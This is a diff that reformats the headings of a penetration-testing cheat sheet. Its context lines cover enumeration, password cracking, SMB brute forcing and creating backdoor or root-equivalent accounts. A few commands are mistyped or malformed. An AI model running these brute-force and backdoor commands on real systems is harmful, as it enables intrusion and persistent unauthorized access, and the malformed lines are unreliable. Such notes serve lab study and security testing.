@@ -1,5 +1,7 @@
 
-ENUMERATION
+
+## ENUMERATION
+
     
     All around scanner
        • python3 autorecon.py $ip -v
@@ -15,7 +17,7 @@ ENUMERATION
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-PORT
+## PORT
 
     Port Scanning & Service Detection
         • unicornscan -mT -I 10.11.1.252:a -v 
@@ -34,7 +36,7 @@ PORT
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-DNS
+## DNS
 
 
     Find DNS server:
@@ -59,7 +61,7 @@ DNS
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-FTP
+## FTP
 
 
     Vulnerability Scanning
@@ -71,7 +73,7 @@ FTP
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-FTP MANUAL SCANS
+## FTP MANUAL SCANS
 
 
     Anonymous login
@@ -92,7 +94,7 @@ FTP MANUAL SCANS
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-HTTP(S)
+## HTTP(S)
 
     Vulnerability Scanning
         • nmap -p 80,443 --script="+*http* and not brute and not dos and not fuzzer" -vv -oN http(s) $ip
@@ -109,7 +111,8 @@ HTTP(S)
 -------------------------------------------------------------------------------------------------------------------------------------
 
  
-MANUAL HTTP SCANS
+
+## MANUAL HTTP SCANS
 
     Check the source code
 
@@ -183,7 +186,7 @@ MANUAL HTTP SCANS
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-MYSQL
+## MYSQL
 
     Vulnerability Scanning
         • nmap -p 3306 --script="+*mysql* and not brute and not dos and not fuzzer" -vv -oN mysql $ip
@@ -197,7 +200,7 @@ MYSQL
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-RPC
+## RPC
 
 
     Find NFS Port
@@ -221,8 +224,7 @@ RPC
          
 -------------------------------------------------------------------------------------------------------------------------------------
 
-
-NFS
+## NFS
 
     Show Mountable NFS Shares
        •  nmap --script=nfs-showmount -oN mountable_shares $ip
@@ -235,8 +237,7 @@ NFS
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-POP3
-
+## POP3
 
     Enumerating user accounts
         • nc -nv $ip 25
@@ -247,7 +248,8 @@ POP3
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-SMB&NETBIOS
+## SMB&NETBIOS
+
  
 
     Over All scan
@@ -284,7 +286,7 @@ SMB&NETBIOS
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-SNMP
+## SNMP
 
     Enumeration Tools
        • Onesixtyone – c <community list file> -I <ip-address>
@@ -311,7 +313,8 @@ SNMP
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-DOMAIN
+## DOMAIN
+
     
     Leak DC hostname:
        • noslookup
@@ -326,7 +329,7 @@ DOMAIN
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-LDAP/Active Directory
+## LDAP/Active Directory
 
     --Look for anonymous bind
        •  ldapsearch -x -b "dc=megabank,dc=local" "*" -h $ip
@@ -334,7 +337,7 @@ LDAP/Active Directory
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-FILE TRANSFER
+## FILE TRANSFER
 
 
     Simple Servers:
@@ -392,7 +395,7 @@ FILE TRANSFER
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-SHELLS
+## SHELLS
 
     Spawning a TTY Shell - Break out of Jail or limited shell You should almost always upgrade your shell after taking control of an apache or www user (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
 
@@ -418,7 +421,8 @@ SHELLS
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
-PSSWD CRACKING
+## PSSWD CRACKING
+
   
 
     • Look for the hash in online databases
@@ -432,13 +436,19 @@ PSSWD CRACKING
        •  john files --wordlist=/usr/share/wordlists/rockyou.txt
 
 
-    PSSWD Mutation
-        Hashcat
+   
+
+## PSSWD Mutation
+
+    Hashcat
            • hashcat -m 0 bfield.hash  /usr/share/wordlists/rockyou.txt -r rules
 
 
-    PSSWD BruteForcing
-        Crackmapexec
+    
+
+## PSSWD BruteForcing
+
+    Crackmapexec
            • Enumerate password policy
                  ▪ crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --pass-pol
            • Bruteforce SMB
@@ -475,7 +485,7 @@ PSSWD CRACKING
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-POST EXPLOITATION LINUX
+## POST EXPLOITATION LINUX
 
     Add user with root privs:
        •  sudo useradd -ou 0 -g 0 john
@@ -511,7 +521,7 @@ POST EXPLOITATION LINUX
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-POST EXPLOITATION WINDOWS
+## POST EXPLOITATION WINDOWS
 
     Backdoor User:
        •  net user backdoor backdoor@123 /add
@@ -552,7 +562,7 @@ POST EXPLOITATION WINDOWS
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-USEFUL LINUX COMMANDS
+## USEFUL LINUX COMMANDS
 
     Find file by name:
        •  find /home/username/ -name "*.err"
@@ -579,7 +589,7 @@ USEFUL LINUX COMMANDS
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-USEFUL WINDOWS COMMANDS
+## USEFUL WINDOWS COMMANDS
 
     Find log files in directory
        •  dir /s *log* 
@@ -605,7 +615,7 @@ USEFUL WINDOWS COMMANDS
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-PIVOTING
+## PIVOTING
 
     Dynamic Port Forwading:
           • SSH 
